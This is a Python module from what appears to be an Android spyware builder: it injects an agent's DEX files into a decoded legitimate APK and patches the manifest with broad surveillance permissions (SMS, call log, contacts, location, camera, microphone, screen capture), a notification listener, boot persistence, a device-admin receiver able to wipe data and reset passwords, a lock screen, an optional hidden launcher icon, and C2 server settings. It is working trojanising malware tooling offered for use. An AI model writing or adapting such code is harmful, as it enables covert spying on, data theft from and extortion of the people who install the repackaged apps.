"""Injeksi dex agent + patch manifest ke APK hasil decode."""
from __future__ import annotations

import re
import secrets
import shutil
from pathlib import Path

PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.ACCESS_BACKGROUND_LOCATION",
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.MODIFY_AUDIO_SETTINGS",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.RECEIVE_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.READ_PHONE_STATE",
    "android.permission.READ_PHONE_NUMBERS",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.READ_MEDIA_IMAGES",
    "android.permission.READ_MEDIA_VIDEO",
    "android.permission.POST_NOTIFICATIONS",
    "android.permission.SET_WALLPAPER",
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION",
    "android.permission.FOREGROUND_SERVICE_CAMERA",
    "android.permission.FOREGROUND_SERVICE_MICROPHONE",
    "android.permission.FOREGROUND_SERVICE_LOCATION",
    "android.permission.WAKE_LOCK",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
    "android.permission.SYSTEM_ALERT_WINDOW",
    "android.permission.QUERY_ALL_PACKAGES",
    "android.permission.VIBRATE",
    "android.permission.READ_MEDIA_AUDIO",
]

PKG = "ai.m4zk1play.spy"


def _dex_numbers(decoded: Path) -> list[int]:
    used = []
    for p in decoded.glob("classes*.dex"):
        m = re.fullmatch(r"classes(\d*)\.dex", p.name)
        if m:
            used.append(int(m.group(1)) if m.group(1) else 1)
    return sorted(used)


def inject_dex(decoded: Path, agent_apk: Path) -> int:
    """Salin semua dex agent sebagai dex lanjutan. Kembalikan jumlah dex disalin."""
    if not agent_apk.exists():
        raise FileNotFoundError(
            "agent/prebuilt/agent.apk tidak ada. Build dulu agent atau jalankan ./install.sh --agent"
        )
    used = _dex_numbers(decoded)
    nxt = (max(used) if used else 1) + 1
    import zipfile

    copied = 0
    with zipfile.ZipFile(agent_apk) as z:
        names = [n for n in z.namelist() if re.fullmatch(r"classes(\d*)\.dex", n)]
        for name in sorted(names):
            (decoded / f"classes{nxt}.dex").write_bytes(z.read(name))
            nxt += 1
            copied += 1
    return copied


def patch_manifest(decoded: Path, c2_url: str, token: str, pin: str,
                   email: str, team: str, hide: bool) -> None:
    mf = decoded / "AndroidManifest.xml"
    xml = mf.read_text(encoding="utf-8")

    # 1. permission
    for perm in PERMISSIONS:
        if f'android:name="{perm}"' in xml:
            continue
        xml = xml.replace(
            "<application",
            f'    <uses-permission android:name="{perm}" />\n    <application',
            1,
        )

    authority = f"{PKG}.boot.{secrets.token_hex(4)}"
    injection = f"""
        <provider
            android:name="{PKG}.BootProvider"
            android:authorities="{authority}"
            android:exported="false"
            android:enabled="true" />

        <service
            android:name="{PKG}.AgentService"
            android:exported="false"
            android:foregroundServiceType="mediaProjection|camera|microphone|location|dataSync" />

        <service
            android:name="{PKG}.NotifListener"
            android:exported="true"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <receiver
            android:name="{PKG}.AdminReceiver"
            android:permission="android.permission.BIND_DEVICE_ADMIN"
            android:exported="true">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/mzk_device_admin" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name="{PKG}.Keys"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
            </intent-filter>
        </receiver>

        <activity
            android:name="{PKG}.LockActivity"
            android:exported="false"
            android:theme="@style/MzkLockTheme" />
"""

    if hide:
        injection += f"""
        <activity-alias
            android:name="{PKG}.Launcher"
            android:targetActivity="{PKG}.MainActivity"
            android:exported="true"
            android:enabled="false">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity-alias>
"""
    else:
        injection += f"""
        <activity
            android:name="{PKG}.MainActivity"
            android:exported="true"
            android:theme="@style/MzkTheme" />
"""

    xml = xml.replace("</application>", injection + "    </application>", 1)
    mf.write_text(xml, encoding="utf-8")

    # 2. meta-data konfigurasi C2 di dalam manifest (dibaca agent saat runtime)
    meta = (
        f'\n        <meta-data android:name="mzk.c2" android:value="{c2_url}" />'
        f'\n        <meta-data android:name="mzk.token" android:value="{token}" />'
        f'\n        <meta-data android:name="mzk.pin" android:value="{pin}" />'
        f'\n        <meta-data android:name="mzk.email" android:value="{email}" />'
        f'\n        <meta-data android:name="mzk.team" android:value="{team}" />'
    )
    xml = mf.read_text(encoding="utf-8").replace("</application>", meta + "\n    </application>", 1)
    mf.write_text(xml, encoding="utf-8")


def inject_assets(decoded: Path) -> None:
    """Salin resource pendukung (xml admin, style) ke hasil decode."""
    res_xml = decoded / "res" / "xml"
    res_xml.mkdir(parents=True, exist_ok=True)
    (res_xml / "mzk_device_admin.xml").write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n'
        '<device-admin xmlns:android="http://schemas.android.com/apk/res/android">\n'
        "  <uses-policies>\n"
        "    <force-lock />\n    <wipe-data />\n    <reset-password />\n"
        "    <limit-password />\n    <watch-login />\n  </uses-policies>\n"
        "</device-admin>\n",
        encoding="utf-8",
    )

    values = decoded / "res" / "values"
    values.mkdir(parents=True, exist_ok=True)
    styles = values / "mzk_styles.xml"
    styles.write_text(
        '<?xml version="1.0" encoding="utf-8"?>\n<resources>\n'
        '  <style name="MzkTheme" parent="android:Theme.Material.NoActionBar">\n'
        '    <item name="android:statusBarColor">#05060a</item>\n'
        '    <item name="android:navigationBarColor">#05060a</item>\n'
        '    <item name="android:windowBackground">#05060a</item>\n'
        "  </style>\n"
        '  <style name="MzkLockTheme" parent="android:Theme.Material.NoActionBar.Fullscreen">\n'
        '    <item name="android:windowBackground">#000000</item>\n'
        "  </style>\n"
        "</resources>\n",
        encoding="utf-8",
    )


def ensure_package_dir(decoded: Path) -> Path:
    smali_root = decoded / "smali"
    target = smali_root / PKG.replace(".", "/")
    if target.exists():
        shutil.rmtree(target)
    target.mkdir(parents=True, exist_ok=True)
    return target
